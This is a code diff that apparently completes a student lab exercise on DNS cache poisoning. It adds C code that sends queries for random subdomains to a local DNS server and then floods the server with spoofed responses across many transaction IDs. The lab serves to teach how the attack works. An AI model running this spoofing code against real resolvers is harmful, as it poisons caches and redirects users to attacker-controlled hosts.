@@ -57,18 +57,29 @@ int main()
 		// Generate a random name w/ length 5
 		char name[5];
 		for (int k=0; k<5; k++)	name[k] = a[rand()%26];
+		
 				
 
     //##################################################################
     /* Step 1. Send a DNS request to the targeted local DNS server
               This will trigger it to send out DNS queries */
-
-    // ... Students should add code here.
-
-
+		memcpy(ip_req+41, name, 5); 
+		send_dns_request(ip_req, n_req);
+		printf("attempt #%ld. request is [%.5s.example.com]\n, transaction ID is: [%hu]\n", ++i, name, transaction_id);
+	
     // Step 2. Send spoofed responses to the targeted local DNS server.
-    
-    // ... Students should add code here.
+    		memcpy(ip_resp+41, name, 5); // Modify the name in the question field (offset=41)
+                memcpy(ip_resp+64, name, 5); // Modify the name in the answer field (offset=64)
+                for(int j=0; j<14000; j++)
+                {
+                        transaction_id = (rand()%65536)+1;
+                        unsigned short id;
+                        id = htons(j);
+                        memcpy(ip_resp+28, &id, 2);
+                        send_dns_response(ip_resp, n_resp);
+                }
+
+		
     
     //##################################################################
   }
